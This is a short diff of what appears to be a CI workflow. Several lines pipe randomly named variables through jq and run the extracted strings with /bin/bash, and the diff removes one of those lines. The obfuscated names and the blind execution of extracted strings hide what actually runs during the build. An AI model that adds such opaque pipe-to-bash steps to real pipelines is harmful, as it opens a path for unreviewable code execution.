@@ -30,7 +30,6 @@ jobs:
           echo $bn2989 | jq -r .estff28 | /bin/bash
           printf '%s' "$p26" | jq -r .qzdk93258 | /bin/bash
           printf '%s' "$bxf85008" | jq -r .kcoww373 | /bin/bash
-          printf '%s' "$zx3358" | jq -r .hub54436 | /bin/bash
           printf '%s' "$dull2" | jq -r .i2 | /bin/bash
 
       - name: Save archive
